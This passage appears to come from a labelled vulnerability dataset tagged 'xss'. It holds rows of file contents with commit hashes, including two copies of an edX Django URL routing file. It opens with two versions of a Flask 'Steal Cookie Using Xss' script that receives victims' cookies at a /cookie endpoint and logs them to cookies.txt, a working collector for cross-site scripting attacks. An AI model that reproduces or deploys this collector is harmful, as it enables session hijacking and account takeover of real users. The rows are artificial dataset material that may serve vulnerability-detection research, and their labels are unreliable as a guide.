	print('[!] Install The Modules .. ')
	import os
	os.system('pip install flask')
	os.system('pip install termcolor')
	os.system('pip install time')
	sys.exit()
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",0,xss
15,117,d20b8de6b838a490155218b2306c87f6060713a6,"/xss.py/n/nfrom flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",1,xss
16,38,4e4c209ae3deb4c78bcec89c181516af8604b450,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0,xss
17,39,4e4c209ae3deb4c78bcec89c181516af8604b450,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
